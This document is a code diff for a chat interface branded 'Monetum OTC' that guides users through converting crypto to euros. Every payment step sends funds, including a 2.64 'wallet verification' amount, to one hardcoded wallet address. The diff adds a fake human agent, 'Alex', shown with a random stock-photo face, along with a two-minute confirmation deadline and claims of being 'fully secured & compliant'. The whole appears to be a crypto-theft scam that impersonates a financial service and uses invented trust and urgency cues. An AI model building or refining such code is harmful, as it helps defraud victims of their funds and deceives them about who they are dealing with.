@@ -23,6 +23,7 @@ const OTC_STEPS = {
   VERIFY_INFO: 'verify_info',
   ASK_CRYPTO: 'ask_crypto',
   ASK_NETWORK: 'ask_network',
+  EXPLAIN_PROCESS: 'explain_process',
   OWNERSHIP_VALIDATION: 'ownership_validation',
   WAIT_OWNERSHIP_TX: 'wait_ownership_tx',
   OWNERSHIP_CONFIRMED: 'ownership_confirmed',
@@ -126,12 +127,22 @@ function processOTCConversation(message: string, currentState: string, userData:
       }
 
     case OTC_STEPS.ASK_NETWORK:
+      return {
+        messages: [
+          `**${userData.network}** selected ✓`,
+          "📋 **Here's how it works:**\n\n**1.** Wallet verification → send a small amount (~2.64 USDC)\n**2.** Full payment → send your crypto\n**3.** Rate & confirmation → you get 2 min to accept the EUR rate\n**4.** Instant credit → EUR sent to your Monetum IBAN\n\n⏱ Total time: **< 2 minutes**\n💰 Cancel anytime (0.5% fee refund)\n🔒 Fully secured & compliant",
+          "Ready to start? Click **Continue** below."
+        ],
+        nextState: OTC_STEPS.EXPLAIN_PROCESS,
+        showContinueButton: true
+      }
+
+    case OTC_STEPS.EXPLAIN_PROCESS:
       const validationAmount = '2.64'
       const validationCrypto = userData.crypto === 'USDC' || userData.crypto === 'USDT' || userData.crypto === 'DAI' ? userData.crypto : 'USDC'
       return {
         messages: [
-          `**${userData.network}** selected ✓`,
-          "🔐 **Wallet Ownership Validation**\n\nWe need to verify you own the sending wallet. Standard compliance procedure.",
+          "🔐 **Step 1: Wallet Verification**",
           `Please send exactly **${validationAmount} ${validationCrypto}** to:\n\n\`0x7F5EB5bB5cF88cfcEe9613368636f458800e62CB\`\n\n**Network:** Ethereum\n\nThis amount will be credited back to you.`,
           "Enter the **TX hash** below or wait for auto-detection."
         ],
@@ -158,8 +169,8 @@ function processOTCConversation(message: string, currentState: string, userData:
     case OTC_STEPS.OWNERSHIP_CONFIRMED:
       return {
         messages: [
-          "✅ **Wallet ownership confirmed!**",
-          "You can now proceed with your full payment.",
+          "✅ **Wallet verified!**",
+          "🔐 **Step 2: Full Payment**",
           `Send your **${userData.crypto}** to:\n\n\`0x7F5EB5bB5cF88cfcEe9613368636f458800e62CB\`\n\n**Network:** ${userData.network}`,
           "Enter the **TX hash** once sent."
         ],
@@ -193,7 +204,7 @@ function processOTCConversation(message: string, currentState: string, userData:
         messages: [
           "✅ **Funds received!**",
           `📊 **Summary:**\n\n| Description | Amount |\n|-------------|--------|\n| ${userData.crypto} Received | ${receivedAmount} ${userData.crypto} |\n| Rate | 1 ${userData.crypto} = €${rate.toFixed(4)} |\n| Gross | €${amountBeforeFees.toFixed(2)} |\n| Fee (0.5%) | -€${fees.toFixed(2)} |\n| **Net** | **€${finalAmount}** |`,
-          "Please **confirm** or **cancel** this transaction."
+          "⏱ **You have 2 minutes** to confirm this rate.\n\nClick **Confirm** to proceed or **Cancel** for a refund (0.5% fee)."
         ],
         nextState: OTC_STEPS.CONFIRM_CONVERSION,
         showConfirmButtons: true,
@@ -222,7 +233,7 @@ function processOTCConversation(message: string, currentState: string, userData:
         return {
           messages: [
             "❌ **Transaction Cancelled**",
-            "Your funds will be returned minus 1% cancellation fee within 24-48h.",
+            "Your funds will be returned minus 0.5% fee within 24-48h.",
             "Anything else I can help with?"
           ],
           nextState: OTC_STEPS.CLOSED,
@@ -235,7 +246,7 @@ function processOTCConversation(message: string, currentState: string, userData:
       return {
         messages: [
           "✅ **Done!**",
-          `**€${userData.transactionData?.netAmount || '0.00'}** will be credited to your Monetum account within minutes.`,
+          `**€${userData.transactionData?.netAmount || '0.00'}** will be credited to your Monetum IBAN within minutes.`,
           `Confirmation email sent to ${userData.email} 📧`,
           "Thanks for using Monetum OTC! 🙏"
         ],
@@ -422,6 +433,13 @@ const htmlTemplate = `<!DOCTYPE html>
             background: #3DA085;
             color: white;
         }
+        .agent-avatar {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            object-fit: cover;
+            flex-shrink: 0;
+        }
     </style>
 </head>
 <body class="min-h-screen flex items-center justify-center p-4">
@@ -506,6 +524,9 @@ const htmlTemplate = `<!DOCTYPE html>
         // State management
         let currentState = 'welcome';
         let userData = {};
+        
+        // Agent avatar URL (random professional male face)
+        const AGENT_AVATAR = 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=100&h=100&fit=crop&crop=face';
 
         const chatContainer = document.getElementById('chatContainer');
         const inputArea = document.getElementById('inputArea');
@@ -566,10 +587,19 @@ const htmlTemplate = `<!DOCTYPE html>
 
         function addMessage(content, isAgent = true) {
             const messageDiv = document.createElement('div');
-            messageDiv.className = 'chat-message flex ' + (isAgent ? 'justify-start' : 'justify-end');
+            messageDiv.className = 'chat-message flex ' + (isAgent ? 'justify-start items-end gap-2' : 'justify-end');
+            
+            if (isAgent) {
+                // Add avatar for agent messages
+                const avatar = document.createElement('img');
+                avatar.src = AGENT_AVATAR;
+                avatar.alt = 'Alex';
+                avatar.className = 'agent-avatar';
+                messageDiv.appendChild(avatar);
+            }
             
             const bubble = document.createElement('div');
-            bubble.className = 'max-w-[85%] px-4 py-2 rounded-2xl ' + (isAgent ? 'agent-bubble rounded-tl-sm' : 'user-bubble rounded-tr-sm');
+            bubble.className = 'max-w-[80%] px-4 py-2 rounded-2xl ' + (isAgent ? 'agent-bubble rounded-bl-sm' : 'user-bubble rounded-tr-sm');
             
             const text = document.createElement('div');
             text.className = 'text-sm leading-relaxed';
@@ -587,8 +617,8 @@ const htmlTemplate = `<!DOCTYPE html>
             
             const typingDiv = document.createElement('div');
             typingDiv.id = 'typingIndicator';
-            typingDiv.className = 'chat-message flex justify-start';
-            typingDiv.innerHTML = '<div class="agent-bubble px-4 py-3 rounded-2xl rounded-tl-sm"><div class="typing-indicator flex gap-1"><span class="w-2 h-2 bg-monetum-green rounded-full"></span><span class="w-2 h-2 bg-monetum-green rounded-full"></span><span class="w-2 h-2 bg-monetum-green rounded-full"></span></div></div>';
+            typingDiv.className = 'chat-message flex justify-start items-end gap-2';
+            typingDiv.innerHTML = '<img src="' + AGENT_AVATAR + '" alt="Alex" class="agent-avatar"><div class="agent-bubble px-4 py-3 rounded-2xl rounded-bl-sm"><div class="typing-indicator flex gap-1"><span class="w-2 h-2 bg-monetum-green rounded-full"></span><span class="w-2 h-2 bg-monetum-green rounded-full"></span><span class="w-2 h-2 bg-monetum-green rounded-full"></span></div></div>';
             chatContainer.appendChild(typingDiv);
             chatContainer.scrollTop = chatContainer.scrollHeight;
         }
@@ -615,6 +645,11 @@ const htmlTemplate = `<!DOCTYPE html>
             
             if (response.sessionEnded) {
                 inputArea.innerHTML = '<div class="text-center text-monetum-muted text-sm"><i class="fas fa-check-circle text-monetum-green mr-2"></i>Session completed</div>';
+                return;
+            }
+            
+            if (response.showContinueButton) {
+                inputArea.innerHTML = '<div class="text-center"><button onclick="sendMessage(\\'continue\\')" class="btn-primary px-8 py-3 rounded-xl text-white font-medium"><i class="fas fa-arrow-right mr-2"></i>Continue</button></div>';
                 return;
             }
             
@@ -668,7 +703,10 @@ const htmlTemplate = `<!DOCTYPE html>
         async function sendMessage(message) {
             if (!message || message.trim() === '') return;
             
-            addMessage(message, false);
+            // Don't show user message for "continue" button
+            if (message !== 'continue') {
+                addMessage(message, false);
+            }
             
             try {
                 const response = await fetch('/api/chat', {
